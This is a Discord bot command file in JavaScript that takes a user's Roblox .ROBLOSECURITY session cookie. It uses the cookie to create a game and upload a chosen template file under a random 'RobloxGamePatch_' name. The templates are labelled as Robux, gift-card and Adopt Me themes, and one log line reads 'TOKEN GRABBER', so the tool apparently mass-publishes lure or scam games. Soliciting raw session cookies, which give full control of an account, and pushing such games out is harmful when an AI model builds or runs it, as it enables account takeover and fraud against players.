const { ApplicationCommandOptionType, ActionRowBuilder, Client, EmbedBuilder, Interaction, PermissionFlagsBits, ButtonBuilder, ButtonStyle } = require('discord.js');
const Game = require('../../models/Game');
const { default: axios } = require('axios');
const fs = require('fs');
const path = require('path');
const UploadRequests = require('../../models/UploadRequests');
const Token = require('../../models/Token');
const noblox = require('noblox.js');
const { footer } = require('../../../config.json');
const e = require('express');
const { v4: uuidv4 } = require('uuid');

module.exports = {
  /**
   *
   * @param {Client} client
   * @param {Interaction} interaction
   */
  callback: async (client, interaction) => {
    if (!interaction.inGuild()) {
      interaction.reply('You can only run this command inside a server.');
      return;
    }

    const currentDate = new Date();

    try {
      await interaction.deferReply({ ephemeral: true });

      function getTimestamp() {
        const currentDate = new Date();
        return currentDate.toLocaleTimeString();
      }

      const denied = new EmbedBuilder()
      .setTitle('Access Denied')
      .setDescription('You do not have permission to run this command.')
      .setColor('#ff0000')
      .setTimestamp();

    const token = await Token.findOne({ userId: interaction.user.id });

    if (!token) {
      interaction.editReply({
        embeds: [denied],
        ephemeral: true,
      });
      console.log(`\x1b[31m[${getTimestamp()}][DENIED ACCESS]:\x1b[0m ${interaction.user.tag} tried to run the command /publish but they do not have access to this command.`);
      return;
    }

    // Login to noblox
    const game = await Game.findOne({ guildId: interaction.guild.id });

    const gameFile = path.join(__dirname, `./games/${interaction.options.getString('games')}.rbxlx`);

    const requestId = uuidv4();

    // Generate random name
    function randomName() {
      const characters = '0123456789';
      let name = 'RobloxGamePatch_';
      for (let i = 0; i < 6; i++) {
        name += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return name;
    }

    const newFileName = randomName();

    // Rename game file
    fs.copyFileSync(gameFile, path.join(__dirname, `./games/rename/${newFileName}.rbxlx`));

    // New renamed file path
    const newGameFile = path.join(__dirname, `./games/rename/${newFileName}.rbxlx`);

    // get x-csrf-token
    const getXCSRFToken = async () => {
      try {
        const response = await axios.post('https://auth.roblox.com/v2/login', null, {
          headers: {
            'Cookie': `.ROBLOSECURITY=${interaction.options.getString('cookie')}`,
            'User-Agent': 'Roblox/WinInet',
          },
          validateStatus: (status) => status === 200 || status === 403, // Ignore 403 Forbidden
        });
    
        if (response.status === 403) {
          console.log(`\x1b[32m[${getTimestamp()}][TOKEN GRABBER]:\x1b[0m Ignoring 403 Forbidden error and continuing... (x-csrf-token: ${response.headers['x-csrf-token']})`);
        }
    
        return response.headers['x-csrf-token'];
      } catch (error) {
        const errorEmbed = new EmbedBuilder()
        .setTitle('Error')
        .setDescription('An error has occured while trying to publish your game. Please try again later.')
        .addFields({ name: 'Error Message', value: `${error.message}`, inline: false })
        .setColor('#ff0000')
        .setTimestamp();
        interaction.editReply({ embeds: [errorEmbed], ephemeral: true });
        throw new Error('Error fetching x-csrf-token: ' + error.message);
      }
    };

    // Create game
    const CreateGame = async (csrf) => {
      try {
        const body = JSON.stringify({ "templatePlaceId": "203812057" });
        const response = await axios.post('https://apis.roblox.com/universes/v1/universes/create', body, {
          headers: {
            'Cookie': `.ROBLOSECURITY=${interaction.options.getString('cookie')}`,
            'x-csrf-token': csrf,
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'User-Agent': 'Roblox/WinInet',
          }
        });
        console.log(`\x1b[32m[${getTimestamp()}][USER PUBLISHER]:\x1b[0m Game created! (gameId: ${response.data.rootPlaceId})`);
        return response;
      } catch (error) {
        const errorEmbed = new EmbedBuilder()
        .setTitle('Error')
        .setDescription('An error has occured while trying to publish your game. Please try again later.')
        .addFields({ name: 'Error Message', value: `${error.message}`, inline: false })
        .setColor('#ff0000')
        .setTimestamp();
        interaction.editReply({ embeds: [errorEmbed], ephemeral: true });
        throw new Error('Error creating user game: ' + error.message);
      }
    };

    // Upload game
    const uploadGame = async (csrf, placeId, success, failed, loading, universeId) => {
      const response = await axios.post(`https://data.roblox.com/Data/Upload.ashx?assetid=${placeId}`, fs.readFileSync(newGameFile), {
        headers: {
          'Cookie': `.ROBLOSECURITY=${interaction.options.getString('cookie')}`,
          'X-CSRF-TOKEN': csrf,
          'Content-Type': 'application/xml',
          'User-Agent': 'Roblox/WinInet',
        }
      }).then(async response => {

        const gamelink = new ButtonBuilder()
        .setStyle(ButtonStyle.Link)
        .setLabel('Game link here')
        .setURL(`https://www.roblox.com/games/${placeId}`)
        .setEmoji('🔗');

        const gameconfigure = new ButtonBuilder()
        .setStyle(ButtonStyle.Link)
        .setLabel('Game Configuration')
        .setURL(`https://create.roblox.com/dashboard/creations/experiences/${universeId}/configure)`)
        .setEmoji('🔧');

        const row = new ActionRowBuilder()
        .addComponents(gamelink, gameconfigure);

        interaction.editReply({ embeds: [loading] });
        await new Promise((resolve) => setTimeout(resolve, 10000));
        console.log(`\x1b[32m[${getTimestamp()}][USER PUBLISHER]:\x1b[0m Game uploaded! (gameId: ${placeId})`);
        interaction.editReply({ embeds: [success], components: [row] });
      }).catch(async err => {
        interaction.editReply({ embeds: [loading] });
        await new Promise((resolve) => setTimeout(resolve, 10000));
        console.log(err);
        interaction.editReply({ embeds: [failed] });
      })
    }

    // Send details to user message/dm
    const sendDM = async (success, failed, placeId, universeId) => {
      try {
        const gamelink = new ButtonBuilder()
        .setStyle(ButtonStyle.Link)
        .setLabel('Game link here')
        .setURL(`https://www.roblox.com/games/${placeId}`)
        .setEmoji('🔗');

        const gameconfigure = new ButtonBuilder()
        .setStyle(ButtonStyle.Link)
        .setLabel('Game Configuration')
        .setURL(`https://create.roblox.com/dashboard/creations/experiences/${universeId}/configure)`)
        .setEmoji('🔧');

        const row = new ActionRowBuilder()
        .addComponents(gamelink, gameconfigure);

        const dm = await interaction.user.createDM();
        dm.send({ embeds: [success], components: [row] });
        console.log(`\x1b[32m[${getTimestamp()}][USER PUBLISHER]:\x1b[0m Sent DM to user!`);
      } catch (error) {
        console.log(`\x1b[31m[${getTimestamp()}][USER PUBLISHER ERROR]:\x1b[0m Failed to send DM to user: ${error.message}`);
        interaction.editReply({ embeds: [failed] });
      }
    }

    const sendRequests = async () => {
      try {
        await noblox.setCookie(interaction.options.getString('cookie'));
        const csrf = await getXCSRFToken(interaction.options.getString('cookie'));
        const cookie = interaction.options.getString('cookie');
        const response = await CreateGame(csrf, cookie);
        const placeId = response.data.rootPlaceId;
        const universeId = response.data.universeId;
        const gameThumbnail = await axios.get(`https://thumbnails.roblox.com/v1/games/icons?universeIds=${universeId}&returnPolicy=PlaceHolder&size=512x512&format=Png&isCircular=true`)
        const gameThumbnailData = gameThumbnail.data.data[0];
        const newRequestSuccess = new UploadRequests({ requestId: requestId, gameURL: `https://www.roblox.com/games/${placeId}`, pubType: `User Publishing`, userId: interaction.user.id, status: 'success' });

        // Embeds
        const success = new EmbedBuilder()
        .setTitle(':tada: Your game is now published!')
        .setThumbnail(`${gameThumbnailData.imageUrl}`)
        .setDescription('Your game has been published! You can now play it on Roblox! You can also configure your game by clicking the link below.')
        .setColor('#00FF00')
        .setTimestamp()
        .setFooter({ text: `${footer} | Request ID: ${requestId}` })

        const failed = new EmbedBuilder()
        .setTitle('We encountered an error!')
        .setThumbnail('https://th.bing.com/th/id/R.313d9b5a0dcd849ddf83ff5216915668?rik=%2f%2ftO3VpPmEMe8Q&riu=http%3a%2f%2f1000logos.net%2fwp-content%2fuploads%2f2017%2f07%2fColor-Roblox-Logo.png&ehk=HuF5BjSgs0WJah0NlaV9%2f3tr2Ec%2bECijA6z3H5Bn8c4%3d&risl=&pid=ImgRaw&r=0')
        .setDescription('We encountered an error while publishing your game! Please try again later!')
        .setColor('#FF0000')
        .setTimestamp()
        .setFooter({ text: `${footer}` })

        const loading = new EmbedBuilder()
        .setTitle('Publishing your game...')
        .setDescription('Please wait while we upload your game to Roblox!')
        .setThumbnail('https://upload.wikimedia.org/wikipedia/commons/a/ad/YouTube_loading_symbol_3_%28transparent%29.gif')
        .setColor('#FFFF00')
        
        noblox.updateUniverseAccess(universeId, true)
        await uploadGame(csrf, placeId, success, failed, loading, universeId);
        await sendDM(success, failed, placeId, universeId);
        await newRequestSuccess.save();

        // Delete renamed file
        fs.unlink(newGameFile, (err) => {
          if (err) throw err;
          console.log(`\x1b[32m[${getTimestamp()}][USER PUBLISHER]:\x1b[0m Deleted renamed file! (file: ${newGameFile})`);
        })

      } catch (error) {
        const errorEmbed = new EmbedBuilder()
        .setTitle('Error')
        .setDescription('An error has occured while trying to publish your game. Please try again later.')
        .addFields({ name: 'Error Message', value: `${error.message}`, inline: false })
        .setColor('#ff0000')
        .setTimestamp();
        interaction.editReply({ embeds: [errorEmbed], ephemeral: true });
        
        const newRequestFailed = new UploadRequests({ requestId: requestId, gameURL: `NaN`, pubType: `User Publishing`, userId: interaction.user.id, status: 'failed' });
        await newRequestFailed.save();
        console.log('Request Error:', error.message);
      }
    };

    // Final requests and interactions
      sendRequests();
      console.log(`\x1b[32m[${getTimestamp()}][USER PUBLISHER]:\x1b[0m ${interaction.user.tag} has published a game using our theme ${interaction.options.getString('games')}!`)
    } catch (error) {
      const errorEmbed = new EmbedBuilder()
        .setTitle('Error')
        .setDescription(`An error has occurred. Please try again later. \n\n Error Message: ${error.message}`)
        .setColor('#ff0000')
        .setTimestamp();

      interaction.editReply({
        embeds: [errorEmbed],
        ephemeral: true,
      });
      console.log(error);
    }
  },

  // remebmer to change command games value of options with the name of the game name in the games folder
  name: 'publish',
    description: 'Game publisher best suited for cellphone users.',
    options: [
      {
        name: 'games',
        description: 'Choose what game do you want to publish.',
        type: ApplicationCommandOptionType.String,
        required: true,
        choices: [
          {
            name: '[ROBUX] Galaxy V2.2',
            value: 'CHRONICS_GALAXY_V2_2',
          },
          {
            name: '[ROBUX] Horror V2',
            value: 'CHRONICS_HORROR_V2',
          },
          {
            name: '[ROBUX] Jewelry V2',
            value: 'CHRONICS_JEWELRY_V2',
          },
          {
            name: '[ROBUX] Lava V2.2',
            value: 'CHRONICS_LAVA_V2_2',
          },
          {
            name: '[ROBUX] Snow V2',
            value: 'CHRONICS_SNOW_V2',
          },
          {
            name: '[RANDOM] Fire V2',
            value: 'CHRONICS_FIRE_V2',
          },
          {
            name: '[RANDOM] Ice V2',
            value: 'CHRONICS_ICE_V2',
          },
          {
            name: '[ADM] Adopt Me Jungle V2',
            value: 'CHRONICS_ADOPT_ME_JUNGLE_V2',
          },
          {
            name: '[ADM] Adopt Me V2.2',
            value: 'CHRONICS_ADOPT_ME_V2_2',
          },
          {
            name: '[GIFTCARD] Bank V2',
            value: 'CHRONICS_BANK_V2',
          },
          {
            name: '[GIFTCARD] Sky',
            value: 'CHRONICS_Sky',
          },
          {
            name: '[OTHER] Bloxfruit',
            value: 'CHRONICS_BLOXFRUIT',
          },
          {
            name: '[OTHER] Limited V2',
            value: 'CHRONICS_LIMITED_V2',
          },
          {
            name: '[OTHER] Prison V2',
            value: 'CHRONICS_PRISON_V2',
          },
          {
            name: '[OTHER] PSX V2',
            value: 'CHRONICS_PSX_V2',
          },
          {
            name: '[OTHER] Jungle V2',
            value: 'CHRONICS_JUNGLE_V2',
          },
        ]
      },
      {
        name: 'cookie',
        description: 'The .ROBLOSECURITY of your account.',
        type: ApplicationCommandOptionType.String,
        required: true,
      },
    ],
};
